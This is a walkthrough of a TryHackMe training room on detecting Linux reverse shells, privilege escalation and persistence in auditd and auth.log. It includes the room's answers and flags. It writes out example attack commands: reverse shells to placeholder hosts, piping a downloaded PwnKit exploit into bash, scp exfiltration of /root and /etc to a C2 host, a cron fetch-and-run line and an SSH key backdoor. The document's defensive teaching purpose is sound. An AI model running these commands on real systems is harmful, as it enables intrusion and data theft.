---
icon: linux
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1757950694269
coverY: 0
coverHeight: 138
---

# Linux Threat Detection 3

**Date:** 06.05.2026&#x20;

**Room Category:** Walkthrough&#x20;

**Core Concept:** Covering the advanced, final stages of manual Linux attacks typically seen in targeted intrusions. This includes detecting reverse shells, privilege escalation, multiple persistence mechanisms, and understanding the ultimate impact of these breaches through system logs.

Not all Linux attacks are simple SSH brute force or cryptomining campaigns. Advanced threat actors conduct carefully planned, targeted operations. This document outlines the complex, manual attack techniques used during these intrusions and details the commands and methodologies to detect them via `auditd` and system logs.

***

## Task 1: Introduction

The primary objective is to learn how reverse shells are used to bypass execution limitations, understand privilege escalation methodologies, explore the five most common Linux persistence techniques, and uncover these actions within system logs.

Question: Let's go!

> **Answer:** No answer needed

***

## Task 2: Reverse Shells

<figure><img src="../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

When Initial Access occurs via a web vulnerability or exploit, attackers usually face a restricted environment lacking terminal conveniences (no colors, no autocompletion, no Ctrl+C, execution timeouts, and rate limits). To bypass these restrictions, attackers establish a **reverse shell,** a session initiated from the victim back to the attacker.

**Common Reverse Shell Commands:**

```bash
# Bash: The victim connects to 10.10.10.10:1337 and launches bash
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1

# Socat: The attacker listens at 10.20.20.20:2525
socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane

# Python: The attacker listens at 10.30.30.30:80
python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
```

**Detecting Reverse Shells:** SOC teams treat reverse shells as critical alerts, indicating active human attacker presence. Detection relies on `auditd` to identify the reverse shell execution and trace it back to its origin (e.g., an exploited web application).

```bash
# Look for suspicious commands like socat
root@thm-vm:~$ ausearch -i -x socat 
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

# Find its parent process and build a process tree
root@thm-vm:~$ ausearch -i --pid 27806 
type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec

# Move up the process tree to confirm its origin - TryPingMe
root@thm-vm:~$ ausearch -i --pid 27796 
type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py
type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
```

**Listing Reverse Shell Activity:** Once the reverse shell is established, trace all subsequent commands executed by the attacker by listing the child processes of the reverse shell process ID.

```bash
# Start from the detected reverse shell
root@thm-vm:~$ ausearch -i -x socat 
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

# List all its child processes
root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle 
type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id
type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a
type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .
[...]
```

<figure><img src="../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

Question: Run 127.0.0.1 && whoami in the TryPingMe web app. What output do you see after the ping results?

> **Answer:** svctrypingme

Question: Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run 127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh in the web app. What is the flag returned in the TryPingMe response?

> **Answer:** THM{revshells\_practitioner!}

Question: Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?

> **Answer:** 10.14.105.255

***

## Task 3: Privilege Escalation



Initial Access often yields a low-privilege service account (e.g., `www-data`), restricting the attacker to specific directories and preventing malware execution. Attackers must use Privilege Escalation to gain `root` access.

**Common Escalation Vectors:**

```bash
# Preceding Discovery: uname -a shows an old, unpatched Ubuntu 16.04
# Privilege Escalation: Run an exploit like PwnKit
wget [http://bad.thm/pwnkit.sh](http://bad.thm/pwnkit.sh) | bash

# Preceding Discovery: find /bin -perm 4000 detects an env binary with the SUID flag
# Privilege Escalation: Use the SUID vulnerability to get root access
/bin/env /bin/bash -p

# Preceding Discovery: ls /etc/ssh exposed an unprotected ssh-backup-key file
# Privilege Escalation: Try using the file to get root access
ssh root@127.0.0.1 -i ssh-backup-key
```

**Detecting Privilege Escalation:** Because there are thousands of unique exploits and SUID misconfigurations, the most universal detection approach is to identify the surrounding behavioral indicators: spikes in Discovery commands, suspicious downloads to the `/tmp` directory, source code compilation, and subsequent data exfiltration.

```bash
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget [http://c2-server.thm/pwnkit.c](http://c2-server.thm/pwnkit.c) -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

You can confirm successful privilege escalation by examining the `uid` field in `auditd` logs before and after the exploit execution.

```bash
# The PwnKit was launched by serviceuser (Look at the UID field)
root@thm-vm:~$ ausearch -i -x pwnkit 
type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit
type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec

# The PwnKit spawned a root shell (Look at the UID field)
root@thm-vm:~$ ausearch -i --ppid 24304 
type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash
type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec

# The threat actor continues the attack as root user
root@thm-vm:~$ ausearch -i --ppid 24310 
type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami
type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
```

Question: Which command line was used to look for the "pass" keyword in files?

> **Answer:** grep -iR pass .

Question: Which command line was used to escalate privileges to root?

> **Answer:** su root

Question: Looking at the detected .env file, what was the root password?

> **Answer:** nGql1pQkGa

***

## Task 4: Startup Persistence

Standalone Linux servers can run for years without rebooting, but threat actors targeting long-term espionage establish startup persistence backdoors to survive system restarts.

**Cron Persistence:** Cron jobs are the simplest method to schedule process execution. For instance, the APT29 group deployed GoldMax malware via cron jobs, and the Rocke cryptominer heavily utilizes cron definitions to continually redownload its mining script.

```bash
# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &

# A simplified command that adds the cron job to /etc/cron.d/root
echo "*/10 * * * root (curl [https://pastebin.com/raw/1NtRkBc3](https://pastebin.com/raw/1NtRkBc3)) | sh" > /etc/cron.d/root
```

**Systemd Persistence:** With root privileges, attackers can create malicious systemd services (located in `/lib/systemd/system` or `/etc/systemd/system`). The Sandworm group created fake services mimicking trusted components to execute their GOGETTER malware.

```bash
# A simplified content of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguised as a trusted file
```

**Detecting Persistence:** Monitor critical configuration files for changes via `auditd` and track the creation of associated management processes (`crontab`, `systemctl`).

```bash
# Look for file changes inside /etc/systemd
root@thm-vm:~$ ausearch -i -f /etc/systemd 
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd

# Look for execution of crontab command
root@thm-vm:~$ ausearch -i -x crontab 
type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e
type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
```

Question: What flag did you get after running the malware persisting as a service?

> **Answer:** THM{hidden\_penguin!}

Question: What flag did you get after running the malware persisting as a cron job?

> **Answer:** THM{ressurect\_on\_reboot!}

***

## Task 5: Account Persistence

To avoid leaving active malware binaries on the system, attackers establish account persistence to maintain reliable, authenticated access.

**New User Account:** Attackers may create a new user account, assign it to a privileged group (`sudo`), and use it for ongoing SSH access. Detection relies on monitoring `/var/log/auth.log`.

```bash
root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'
2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001
2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo'
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
```

**Backdoored SSH Keys:** Attackers append their own public key to an existing user's `~/.ssh/authorized_keys` file. Because shell builtins like `echo` obscure the exact command in `auditd`, defenders must explicitly monitor the `authorized_keys` file for modifications.

```bash
# Adding SSH backdoor to the authorized_keys
root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys

# It's hard to guess which key is a backdoor!
root@thm-vm:~$ cat ~/.ssh/authorized_keys
ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key
ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key
ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key

# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"
# Note how the malicious "echo" command is logged simply as "bash"
root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
```

**Application Persistence:** Attackers may place web shells (e.g., WSO web shell) directly into web application directories (e.g., WordPress). This persistence mechanism operates at the application layer, completely bypassing OS-level `auditd` and system logs.

<figure><img src="../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

Question: Which user was created and added to the sudo group?

> **Answer:** koichi

Question: Which file was changed to allow SSH key persistence?

> **Answer:** /root/.ssh/authorized\_keys

***

## Task 6: Targeted Attacks and Recap

<figure><img src="../.gitbook/assets/image (329).png" alt="" width="375"><figcaption></figcaption></figure>

Unlike automated "Hack and Forget" scripts, targeted attacks involve deliberate, long-term operations against specific organizations for high-impact objectives.

<figure><img src="../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

**Linux as an Entry Point:** Because Linux hosts mission-critical applications (firewalls, web servers, mail servers), compromising a single Linux edge server can grant attackers a foothold to pivot deep into a predominantly Windows-based corporate network.

<figure><img src="../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

**Linux in Espionage:** State-sponsored APT groups actively target Linux systems to conduct espionage. Campaigns like Kimsuky APT utilize Linux servers for prolonged data theft, employing clever persistence mechanisms (like hiding backdoors as legitimate-sounding systemd services such as `syslogd`).

<figure><img src="../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

**Linux in Ransomware:** Linux ransomware is heavily on the rise, primarily targeting hypervisors (e.g., ESXi). Breaching a single physical Linux hypervisor allows attackers to instantly encrypt and hold for ransom hundreds of hosted Windows virtual machines, creating catastrophic business impact.

<figure><img src="../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

Question: Does Linux ransomware exist and impact organizations worldwide? (Yea/Nay)

> **Answer:** Yea

Question: Should you learn Linux threats even if working with Windows? (Yea/Nay)

> **Answer:** Yea

***

## Conclusion

Targeted Linux intrusions utilize complex methodologies to overcome restrictions, escalate privileges, and solidify persistence. Understanding these advanced mechanics, from establishing reverse shells to deploying deceptive `systemd` persistence is crucial for comprehensively defending infrastructure. Recognizing how these actions manifest in `auditd` and authentication logs eliminates critical blind spots within SOC monitoring.
